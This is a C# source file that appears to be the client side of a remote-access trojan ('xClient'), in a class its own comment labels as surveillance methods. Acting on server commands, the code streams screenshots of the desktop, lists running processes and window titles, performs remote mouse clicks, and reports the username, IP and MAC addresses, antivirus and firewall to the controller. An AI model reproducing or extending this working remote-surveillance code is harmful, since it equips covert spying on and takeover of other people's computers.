using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using xClient.Core.Helper;
using System.Drawing.Imaging;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT ARE USED FOR SURVEILLANCE. */
    public static partial class CommandHandler
    {
        public static void HandleRemoteDesktop(Packets.ServerPackets.Desktop command, Client client)
        {
            if (StreamCodec == null || StreamCodec.ImageQuality != command.Quality ||
                StreamCodec.Monitor != command.Monitor)
                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor);

            LastDesktopScreenshot = Helper.Helper.GetDesktop(command.Monitor);
            BitmapData bmpdata = LastDesktopScreenshot.LockBits(
                new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), ImageLockMode.ReadWrite,
                LastDesktopScreenshot.PixelFormat);

            using (MemoryStream stream = new MemoryStream())
            {
                try
                {
                    StreamCodec.CodeImage(bmpdata.Scan0,
                        new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height),
                        new Size(LastDesktopScreenshot.Width, LastDesktopScreenshot.Height),
                        LastDesktopScreenshot.PixelFormat,
                        stream);
                    new Packets.ClientPackets.DesktopResponse(stream.ToArray(), StreamCodec.ImageQuality,
                        StreamCodec.Monitor).Execute(client);
                }
                catch
                {
                    new Packets.ClientPackets.DesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor)
                        .Execute(client);
                    StreamCodec = null;
                }
            }

            LastDesktopScreenshot.UnlockBits(bmpdata);
            LastDesktopScreenshot.Dispose();
        }

        public static void HandleGetProcesses(Packets.ServerPackets.GetProcesses command, Client client)
        {
            Process[] pList = Process.GetProcesses();
            string[] processes = new string[pList.Length];
            int[] ids = new int[pList.Length];
            string[] titles = new string[pList.Length];

            int i = 0;
            foreach (Process p in pList)
            {
                processes[i] = p.ProcessName + ".exe";
                ids[i] = p.Id;
                titles[i] = p.MainWindowTitle;
                i++;
            }

            new Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
        }

        public static void HandleMouseClick(Packets.ServerPackets.MouseClick command, Client client)
        {
            if (command.LeftClick)
            {
                SetCursorPos(command.X, command.Y);
                mouse_event(MOUSEEVENTF_LEFTDOWN, command.X, command.Y, 0, 0);
                mouse_event(MOUSEEVENTF_LEFTUP, command.X, command.Y, 0, 0);
                if (command.DoubleClick)
                {
                    mouse_event(MOUSEEVENTF_LEFTDOWN, command.X, command.Y, 0, 0);
                    mouse_event(MOUSEEVENTF_LEFTUP, command.X, command.Y, 0, 0);
                }
            }
            else
            {
                SetCursorPos(command.X, command.Y);
                mouse_event(MOUSEEVENTF_RIGHTDOWN, command.X, command.Y, 0, 0);
                mouse_event(MOUSEEVENTF_RIGHTUP, command.X, command.Y, 0, 0);
                if (command.DoubleClick)
                {
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, command.X, command.Y, 0, 0);
                    mouse_event(MOUSEEVENTF_RIGHTUP, command.X, command.Y, 0, 0);
                }
            }
        }

        public static void HandleGetSystemInfo(Packets.ServerPackets.GetSystemInfo command, Client client)
        {
            try
            {
                string[] infoCollection = new string[]
                {
                    "Processor (CPU)",
                    SystemCore.GetCpu(),
                    "Memory (RAM)",
                    string.Format("{0} MB", SystemCore.GetRam()),
                    "Video Card (GPU)",
                    SystemCore.GetGpu(),
                    "Username",
                    SystemCore.GetUsername(),
                    "PC Name",
                    SystemCore.GetPcName(),
                    "Uptime",
                    SystemCore.GetUptime(),
                    "MAC Address",
                    SystemCore.GetMacAddress(),
                    "LAN IP Address",
                    SystemCore.GetLanIp(),
                    "WAN IP Address",
                    SystemCore.WanIp,
                    "Antivirus",
                    SystemCore.GetAntivirus(),
                    "Firewall",
                    SystemCore.GetFirewall()
                };

                new Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
            }
            catch
            {
            }
        }

        public static void HandleMonitors(Packets.ServerPackets.Monitors command, Client client)
        {
            new Packets.ClientPackets.MonitorsResponse(Screen.AllScreens.Length).Execute(client);
        }
    }
}